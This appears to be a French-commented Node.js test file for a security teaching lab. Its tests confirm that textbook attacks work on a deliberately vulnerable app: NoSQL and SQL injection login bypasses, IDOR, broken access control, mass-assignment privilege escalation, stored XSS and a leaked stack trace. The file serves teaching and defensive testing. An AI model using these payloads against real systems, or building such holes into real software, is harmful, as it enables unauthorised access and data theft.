// Tests d'ATTAQUE sur la version vulnérable.
// Ils DÉMONTRENT que les attaques RÉUSSISSENT (état initial du TP).
// Sur la branche/dossier `secure`, les mêmes attaques doivent échouer.
const { test } = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const jwt = require('jsonwebtoken');
const { createApp, JWT_SECRET } = require('../src/app');

const app = createApp();
const tokenAlice = jwt.sign({ id: 1, role: 'user' }, JWT_SECRET);

test('NoSQL injection : login admin sans mot de passe via $ne', async () => {
  const res = await request(app)
    .post('/api/login')
    .send({ email: 'admin@example.com', password: { $ne: 'x' } });
  assert.strictEqual(res.status, 200, 'le bypass réussit (vulnérable)');
  assert.ok(res.body.token);
});

test('SQL injection : récupérer tous les users via OR 1=1', async () => {
  const res = await request(app)
    .get('/api/users/search')
    .query({ email: "' OR '1'='1" });
  assert.ok(res.body.length >= 3, 'toutes les lignes fuitent (vulnérable)');
});

test('IDOR : Alice lit la commande de Bob', async () => {
  const res = await request(app)
    .get('/api/orders/102') // commande de Bob
    .set('Authorization', 'Bearer ' + tokenAlice);
  assert.strictEqual(res.status, 200);
  assert.strictEqual(res.body.userId, 2, 'accès à la commande d’autrui (vulnérable)');
});

test('Broken access control : user accède à la route admin', async () => {
  const res = await request(app)
    .get('/api/admin/users')
    .set('Authorization', 'Bearer ' + tokenAlice);
  assert.strictEqual(res.status, 200, 'pas de contrôle de rôle (vulnérable)');
});

test('Mass assignment : Alice se promeut admin', async () => {
  const res = await request(app)
    .put('/api/me')
    .set('Authorization', 'Bearer ' + tokenAlice)
    .send({ role: 'admin', balance: 999999 });
  assert.strictEqual(res.body.role, 'admin', 'élévation de privilège (vulnérable)');
  assert.strictEqual(res.body.balance, 999999);
});

test('XSS stocké : le <script> est renvoyé tel quel dans le HTML', async () => {
  await request(app)
    .post('/api/comments')
    .send({ author: 'attacker', body: '<script>alert(1)</script>' });
  const res = await request(app).get('/comments');
  assert.ok(res.text.includes('<script>alert(1)</script>'), 'script non échappé (vulnérable)');
});

test('Fuite d’info : la stack trace est exposée', async () => {
  const res = await request(app).get('/api/boom');
  assert.strictEqual(res.status, 500);
  assert.ok(res.body.stack, 'stack trace renvoyée au client (vulnérable)');
  assert.ok(res.body.error.includes('host='), 'détails internes exposés');
});
